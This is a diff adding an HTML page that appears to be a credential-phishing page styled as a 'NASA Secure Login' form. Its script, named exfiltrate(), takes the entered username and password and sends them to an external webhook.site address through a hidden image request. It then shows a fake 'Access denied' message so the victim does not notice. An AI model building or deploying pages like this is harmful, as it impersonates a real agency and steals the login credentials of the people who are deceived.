@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>NASA Secure Login</title>
+  <meta charset="utf-8" />
+  <style>
+    body {{
+      font-family: sans-serif;
+      background: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }}
+    .login {{
+      background: #fff;
+      padding: 40px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 10px;
+    }}
+    input {{
+      display: block;
+      margin-bottom: 15px;
+      padding: 10px;
+      width: 100%;
+    }}
+    button {{
+      padding: 10px 15px;
+      background: #004b8d;
+      color: white;
+      border: none;
+    }}
+  </style>
+</head>
+<body>
+  <div class="login">
+    <h2>NASA Secure Login</h2>
+    <form onsubmit="exfiltrate(); return false;">
+      <input type="text" id="user" placeholder="Username" />
+      <input type="password" id="pass" placeholder="Password" />
+      <button type="submit">Login</button>
+    </form>
+    <p id="log" style="color:red;"></p>
+  </div>
+
+  <script>
+    function exfiltrate() {{
+      const u = document.getElementById("user").value;
+      const p = document.getElementById("pass").value;
+      document.getElementById("log").innerText = "Logging in...";
+      new Image().src = "https://webhook.site/7efd8b7e-f9f4-4b3d-bd7b-d329ec5d72a5?user=" + encodeURIComponent(u) + "&pass=" + encodeURIComponent(p);
+      setTimeout(() => {{
+        document.getElementById("log").innerText = "Access denied. Try again.";
+      }}, 2000);
+    }}
+  </script>
+</body>
+</html>
